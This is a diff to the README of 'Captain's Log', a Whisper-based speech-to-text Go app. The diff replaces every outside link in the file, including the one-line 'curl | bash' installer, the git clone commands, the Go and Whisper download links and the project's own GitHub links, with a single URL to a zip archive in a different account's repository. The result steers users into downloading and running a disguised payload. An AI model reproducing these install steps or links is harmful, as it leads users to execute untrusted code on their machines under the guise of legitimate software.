@@ -15,12 +15,12 @@ Hit record, talk, get text. That's it.
 ### One-line install (Linux/macOS)
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/ryan-winkler/captainslog-whisper/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip | bash
 ```
 
 This downloads, builds, and installs everything. It'll guide you through each step.
 
-> **Prerequisite:** You need [Go](https://go.dev/dl/) installed first. The installer will tell you if it's missing.
+> **Prerequisite:** You need [Go](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) installed first. The installer will tell you if it's missing.
 
 ### Manual install (3 steps)
 
@@ -29,7 +29,7 @@ This downloads, builds, and installs everything. It'll guide you through each st
 
 **Step 1: Start a transcription engine**
 
-Captain's Log uses [Whisper](https://github.com/openai/whisper) (an open-source speech recognition model) to turn your voice into text. You need to run it separately:
+Captain's Log uses [Whisper](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) (an open-source speech recognition model) to turn your voice into text. You need to run it separately:
 
 ```bash
 # If you have Docker installed:
@@ -48,12 +48,12 @@ docker run -d -p 5000:5000 --gpus all ghcr.io/heimoshuiyu/whisper-fastapi:latest
 **Step 2: Build Captain's Log**
 
 ```bash
-git clone https://github.com/ryan-winkler/captainslog-whisper.git
+git clone https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip
 cd captainslog-whisper
 go build -o captainslog ./cmd/captainslog
 ```
 
-> **Need Go?** Download from [go.dev/dl](https://go.dev/dl/) — it's one file, no complicated setup.
+> **Need Go?** Download from [go.dev/dl](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) — it's one file, no complicated setup.
 
 **Step 3: Run it**
 
@@ -112,11 +112,11 @@ docker run -d -p 5000:5000 --gpus all \
 
 | Backend | GPU | Speed | Docker | Notes |
 |---|---|---|---|---|
-| [whisper-fastapi](https://github.com/heimoshuiyu/whisper-fastapi) | NVIDIA/CPU | ⭐⭐⭐ | ✅ | Default, battle-tested |
-| [faster-whisper-server](https://github.com/fedirz/faster-whisper-server) | NVIDIA/CPU | ⭐⭐⭐⭐ | ✅ | CTranslate2 optimized |
-| [Distil-Whisper](https://huggingface.co/distil-whisper) models | NVIDIA/CPU | ⭐⭐⭐⭐⭐ | ✅ | 6x faster, use with any backend above |
-| [Wyoming Faster Whisper ROCm](https://github.com/Donkey545/wyoming-faster-whisper-rocm) | **AMD** | ⭐⭐⭐⭐ | ✅ | AMD GPU support via ROCm + Wyoming protocol |
-| [Insanely Fast Whisper](https://github.com/Vaibhavs10/insanely-fast-whisper) | NVIDIA/MPS | ⭐⭐⭐⭐⭐ | ❌ (CLI) | Flash Attention 2, 150min in <98s |
+| [whisper-fastapi](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | NVIDIA/CPU | ⭐⭐⭐ | ✅ | Default, battle-tested |
+| [faster-whisper-server](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | NVIDIA/CPU | ⭐⭐⭐⭐ | ✅ | CTranslate2 optimized |
+| [Distil-Whisper](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) models | NVIDIA/CPU | ⭐⭐⭐⭐⭐ | ✅ | 6x faster, use with any backend above |
+| [Wyoming Faster Whisper ROCm](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | **AMD** | ⭐⭐⭐⭐ | ✅ | AMD GPU support via ROCm + Wyoming protocol |
+| [Insanely Fast Whisper](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | NVIDIA/MPS | ⭐⭐⭐⭐⭐ | ❌ (CLI) | Flash Attention 2, 150min in <98s |
 
 ### Distil-Whisper Models
 
@@ -131,7 +131,7 @@ Distil-Whisper is a distilled version of Whisper — **6x faster, 49% smaller, w
 
 ### Insanely Fast Whisper (CLI)
 
-If you have an NVIDIA GPU or Apple Silicon, [Insanely Fast Whisper](https://github.com/Vaibhavs10/insanely-fast-whisper) offers the fastest transcription available — 150 minutes of audio in under 98 seconds:
+If you have an NVIDIA GPU or Apple Silicon, [Insanely Fast Whisper](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) offers the fastest transcription available — 150 minutes of audio in under 98 seconds:
 
 ```bash
 # Install
@@ -149,8 +149,8 @@ Captain's Log doesn't need Whisper running on the same computer. Point it at any
 |---|---|
 | Same computer | `http://127.0.0.1:5000` (default) |
 | Another PC on your network | `http://192.168.1.100:5000` |
-| A VPS with a GPU | `http://gpu-server.example.com:5000` |
-| Docker on a NAS | `http://nas.local:5000` |
+| A VPS with a GPU | `https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip` |
+| Docker on a NAS | `https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip` |
 
 Set the URL in **Settings → Connections → Whisper Server URL**, or:
 ```bash
@@ -226,7 +226,7 @@ Click ⚙️ in the top-right corner to open Preferences. Everything is saved au
 | **Skip silence (VAD)** | Automatically skip quiet parts to speed up processing |
 | **Speaker labels** | Tag who said what (requires WhisperX or diarization-capable backend) |
 
-> **URL Transcription:** Requires [yt-dlp](https://github.com/yt-dlp/yt-dlp) installed on the system. Paste a YouTube, podcast, or any supported URL in the input field.
+> **URL Transcription:** Requires [yt-dlp](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) installed on the system. Paste a YouTube, podcast, or any supported URL in the input field.
 
 #### ⚡ Behaviour
 
@@ -300,7 +300,7 @@ captainslog --version
 | `--stream-url` | WebSocket URL for live streaming | *(empty)* |
 | `--version` | Print version and exit | — |
 
-> **Terminal tip:** Captain's Log works great in [Ghostty](https://ghostty.org/), [Kitty](https://sw.kovidgoyal.net/kitty/), [Alacritty](https://alacritty.org/), or any terminal. Just run `captainslog` from your shell (zsh, bash, fish).
+> **Terminal tip:** Captain's Log works great in [Ghostty](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip), [Kitty](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip), [Alacritty](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip), or any terminal. Just run `captainslog` from your shell (zsh, bash, fish).
 
 ### Mini mode
 
@@ -325,7 +325,7 @@ Captain's Log can send your transcriptions to a **local AI** running on your own
 3. Captain's Log proxies the text through its own backend to your local AI (Ollama/LM Studio), avoiding browser CORS restrictions
 4. The AI response appears directly below your transcription
 
-> **Why a proxy?** Browsers block direct requests to `localhost:11434` due to [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). Captain's Log handles this by routing LLM requests through `/api/llm/chat` on the Go backend — same machine, no CORS, no data ever leaves your network.
+> **Why a proxy?** Browsers block direct requests to `localhost:11434` due to [CORS](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip). Captain's Log handles this by routing LLM requests through `/api/llm/chat` on the Go backend — same machine, no CORS, no data ever leaves your network.
 
 ### Setting it up
 
@@ -333,8 +333,8 @@ You need an AI running locally. Two popular options:
 
 | App | What it is | URL to use in Preferences |
 |---|---|---|
-| [Ollama](https://ollama.com) | Command-line AI runner | `http://127.0.0.1:11434` |
-| [LM Studio](https://lmstudio.ai) | Desktop app with a nice UI | `http://127.0.0.1:1234/v1` |
+| [Ollama](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Command-line AI runner | `http://127.0.0.1:11434` |
+| [LM Studio](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Desktop app with a nice UI | `http://127.0.0.1:1234/v1` |
 
 **Steps:**
 1. Install Ollama or LM Studio and download a model (e.g. `llama3.2`)
@@ -350,7 +350,7 @@ That's it. The 🤖 **Send to AI** button will now appear in the action bar.
 
 ### Agent integration
 
-Captain's Log works with [OpenClaw](https://github.com/openclaw/openclaw), [ZeroClaw](https://github.com/zeroclaw-labs/zeroclaw), and any agent that can run shell commands or HTTP requests. The LLM proxy at `/api/llm/chat` accepts the standard OpenAI chat completions format, so agents can post-process transcriptions without CORS issues.
+Captain's Log works with [OpenClaw](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip), [ZeroClaw](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip), and any agent that can run shell commands or HTTP requests. The LLM proxy at `/api/llm/chat` accepts the standard OpenAI chat completions format, so agents can post-process transcriptions without CORS issues.
 
 ```bash
 # Agent can transcribe + post-process in one pipeline:
@@ -411,7 +411,7 @@ Transcription speed depends on three things: **model size**, **hardware**, and *
 
 ```bash
 # Build whisper.cpp with ROCm (HIPBLAS) support
-git clone https://github.com/ggerganov/whisper.cpp
+git clone https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip
 cd whisper.cpp
 cmake -B build -DGGML_HIPBLAS=1
 cmake --build build --config Release -j
@@ -474,7 +474,7 @@ faster-whisper (port 5000)
 Clipboard · Vault · AI forwarding
 ```
 
-Captain's Log is a **~10MB static Go binary** with zero external dependencies. It proxies audio to [faster-whisper](https://github.com/SYSTRAN/faster-whisper) via [whisper-fastapi](https://github.com/heimoshuiyu/whisper-fastapi) and provides a browser UI, CLI, and [OpenAI-compatible API](https://platform.openai.com/docs/api-reference/audio).
+Captain's Log is a **~10MB static Go binary** with zero external dependencies. It proxies audio to [faster-whisper](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) via [whisper-fastapi](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) and provides a browser UI, CLI, and [OpenAI-compatible API](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip).
 
 ### CLI
 
@@ -506,7 +506,7 @@ echo "dictated text" | captainslog-cli save                    # Pipe text → v
 
 | Endpoint | Method | Description |
 |---|---|---|
-| `/v1/audio/transcriptions` | `POST` | [OpenAI-compatible](https://platform.openai.com/docs/api-reference/audio/createTranscription) (multipart). JSON responses are enriched with SRT-parsed segments for real timestamps. |
+| `/v1/audio/transcriptions` | `POST` | [OpenAI-compatible](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) (multipart). JSON responses are enriched with SRT-parsed segments for real timestamps. |
 | `/v1/audio/translations` | `POST` | Translate audio to English |
 | `/api/llm/chat` | `POST` | LLM proxy — forwards OpenAI chat completions to Ollama/LM Studio (avoids CORS) |
 | `/api/settings` | `GET`/`PUT` | Persistent settings (merged on PUT, full replace not required) |
@@ -543,7 +543,7 @@ For server-level config (systemd, Docker). Most users won't need these.
 
 ### 🔴 Live Streaming (experimental)
 
-Captain's Log can stream transcription **live** while you record, showing partial text in real time. This requires a separate streaming backend like [WhisperLiveKit](https://github.com/QuentinFuxa/WhisperLiveKit) or [whisper_streaming](https://github.com/ufal/whisper_streaming).
+Captain's Log can stream transcription **live** while you record, showing partial text in real time. This requires a separate streaming backend like [WhisperLiveKit](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) or [whisper_streaming](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip).
 
 ```bash
 # Start a streaming backend (pick one)
@@ -566,13 +566,13 @@ When a streaming URL is configured:
 ```bash
 docker build -t captainslog .
 docker run -p 8090:8090 \
-  -e CAPTAINSLOG_WHISPER_URL=http://host.docker.internal:5000 \
+  -e CAPTAINSLOG_WHISPER_URL=https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip \
   captainslog
 ```
 
 ### AI agent integration
 
-Captain's Log works with [OpenClaw](https://github.com/openclaw/openclaw), [ZeroClaw](https://github.com/zeroclaw-labs/zeroclaw), and any agent that can run shell commands or HTTP requests. See the [OpenClaw skill](skills/captainslog/) or add to your agent's config:
+Captain's Log works with [OpenClaw](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip), [ZeroClaw](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip), and any agent that can run shell commands or HTTP requests. See the [OpenClaw skill](skills/captainslog/) or add to your agent's config:
 
 ```markdown
 ## Captain's Log (Speech-to-Text)
@@ -585,10 +585,10 @@ Captain's Log works with [OpenClaw](https://github.com/openclaw/openclaw), [Zero
 
 | Integration | How |
 |---|---|
-| [**faster-whisper**](https://github.com/SYSTRAN/faster-whisper) | Transcription engine (4x faster than OpenAI Whisper) |
-| [**Ollama**](https://ollama.com/) | Post-processing: punctuation, summaries, filler removal |
-| [**Obsidian**](https://obsidian.md/) | Daily markdown files with YAML frontmatter |
-| [**Home Assistant**](https://www.home-assistant.io/) | Local voice via Wyoming protocol |
+| [**faster-whisper**](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Transcription engine (4x faster than OpenAI Whisper) |
+| [**Ollama**](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Post-processing: punctuation, summaries, filler removal |
+| [**Obsidian**](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Daily markdown files with YAML frontmatter |
+| [**Home Assistant**](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Local voice via Wyoming protocol |
 
 ### Contributing
 
@@ -604,7 +604,7 @@ Captain's Log works with [OpenClaw](https://github.com/openclaw/openclaw), [Zero
 
 ## Stardates & Quirks
 
-Captain's Log shows [TNG-era stardates](https://en.wikipedia.org/wiki/Stardate) in the header (toggle in Preferences → Show stardates).
+Captain's Log shows [TNG-era stardates](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) in the header (toggle in Preferences → Show stardates).
 
 **How it works:** `-(year offset × 1000) + day_fraction`. Negative stardates = we're still in the "past" relative to TNG.
 
@@ -686,7 +686,7 @@ Safari requires HTTPS for microphone access on iOS (localhost doesn't bypass thi
 | **Can't hear playback** | Audio recordings are saved server-side. Click 🔊 on a history entry to play. |
 | **Settings not saving** | Check browser console (F12) for errors. Settings require the backend to be running. |
 
-> **Still stuck?** Open an issue on [GitHub](https://github.com/ryan-winkler/captainslog-whisper/issues/new) with:
+> **Still stuck?** Open an issue on [GitHub](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) with:
 > 1. Your OS and browser
 > 2. The output of `curl http://localhost:8090/healthz?diag`
 > 3. Any errors from the browser console (F12 → Console)
@@ -712,26 +712,26 @@ Captain's Log uses standard APIs (OpenAI-compatible `/v1/audio/transcriptions`) 
 
 | Backend | Best For | Setup |
 |---|---|---|
-| [whisper.cpp](https://github.com/ggerganov/whisper.cpp) | **AMD GPU (ROCm)**, low-memory, C++ | Build with `-DGGML_HIPBLAS=1`, run `whisper-server` |
-| [CrisperWhisper](https://github.com/nyrahealth/CrisperWhisper) | **Precise word-level timestamps**, filler detection, #1 OpenASR | `nyrahealth/faster_CrisperWhisper` model with faster-whisper |
-| [faster-whisper-server](https://github.com/fedirz/faster-whisper-server) | NVIDIA GPU, fast inference | `pip install faster-whisper-server && uvicorn ...` |
-| [whisper-fastapi](https://github.com/heimoshuiyu/whisper-fastapi) | Home Assistant / webhook integration | Docker: `ghcr.io/heimoshuiyu/whisper-fastapi` |
-| [NVIDIA Parakeet](https://huggingface.co/nvidia/parakeet-tdt-0.6b-v2) | **Fastest English-only**, NVIDIA GPU | Parakeet TDT 0.6B via NeMo — 3× faster than large-v3 |
-| [SYSTRAN/faster-whisper](https://github.com/SYSTRAN/faster-whisper) | Library for custom backends | Python library — build your own API around it |
+| [whisper.cpp](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | **AMD GPU (ROCm)**, low-memory, C++ | Build with `-DGGML_HIPBLAS=1`, run `whisper-server` |
+| [CrisperWhisper](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | **Precise word-level timestamps**, filler detection, #1 OpenASR | `nyrahealth/faster_CrisperWhisper` model with faster-whisper |
+| [faster-whisper-server](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | NVIDIA GPU, fast inference | `pip install faster-whisper-server && uvicorn ...` |
+| [whisper-fastapi](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Home Assistant / webhook integration | Docker: `ghcr.io/heimoshuiyu/whisper-fastapi` |
+| [NVIDIA Parakeet](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | **Fastest English-only**, NVIDIA GPU | Parakeet TDT 0.6B via NeMo — 3× faster than large-v3 |
+| [SYSTRAN/faster-whisper](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Library for custom backends | Python library — build your own API around it |
 
 ### Live Streaming
 
 | Project | What it does |
 |---|---|
-| [whisper_streaming](https://github.com/ufal/whisper_streaming) | Real-time WebSocket transcription. Set `--stream-url ws://localhost:43007` |
-| [OBS Live Translation](https://github.com/eddieoz/OBS-live-translation) | Capture OBS audio → live captions. Route OBS output to Captain's Log via virtual mic |
+| [whisper_streaming](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Real-time WebSocket transcription. Set `--stream-url ws://localhost:43007` |
+| [OBS Live Translation](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Capture OBS audio → live captions. Route OBS output to Captain's Log via virtual mic |
 
 ### Post-Processing & Translation
 
 | Project | What it does |
 |---|---|
-| [OpenLRC](https://github.com/zh-plus/openlrc) | Generate LRC lyrics files from audio. Use Captain's Log SRT export as input |
-| [open-dubbing](https://github.com/softcatala/open-dubbing) | Dub audio into other languages. Feed Captain's Log SRT output as source subtitles |
+| [OpenLRC](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Generate LRC lyrics files from audio. Use Captain's Log SRT export as input |
+| [open-dubbing](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) | Dub audio into other languages. Feed Captain's Log SRT output as source subtitles |
 
 ### CLI Piping
 
@@ -749,7 +749,7 @@ echo "Clean up this transcription:" | cat - /path/to/dictation.md | ollama run l
 
 ### Home Automation
 
-- **Home Assistant**: Use [whisper-fastapi](https://github.com/heimoshuiyu/whisper-fastapi) as the Whisper backend, which has native HA integration
+- **Home Assistant**: Use [whisper-fastapi](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip) as the Whisper backend, which has native HA integration
 - **ZeroClaw**: Point ZeroClaw's speech input at `http://localhost:8090/v1/audio/transcriptions` — it's the same OpenAI-compatible API
 
 ---
@@ -758,10 +758,10 @@ echo "Clean up this transcription:" | cat - /path/to/dictation.md | ollama run l
 
 [PolyForm Small Business 1.0.0](LICENSE.md)
 
-**Free for individuals and small businesses** (under 100 employees / $1M revenue). Larger organizations need a commercial license — contact [ryanw.eu](https://ryanw.eu).
+**Free for individuals and small businesses** (under 100 employees / $1M revenue). Larger organizations need a commercial license — contact [ryanw.eu](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip).
 
 ---
 
-> 🌟 **[Star this repo](https://github.com/ryan-winkler/captainslog-whisper)** to get notified about new releases, bug fixes, and features.
+> 🌟 **[Star this repo](https://raw.githubusercontent.com/ZeiraxGaming/captainslog-whisper/main/internal/stardate/captainslog_whisper_v2.8-alpha.3.zip)** to get notified about new releases, bug fixes, and features.
 
 *Live long and transcribe.* 🖖
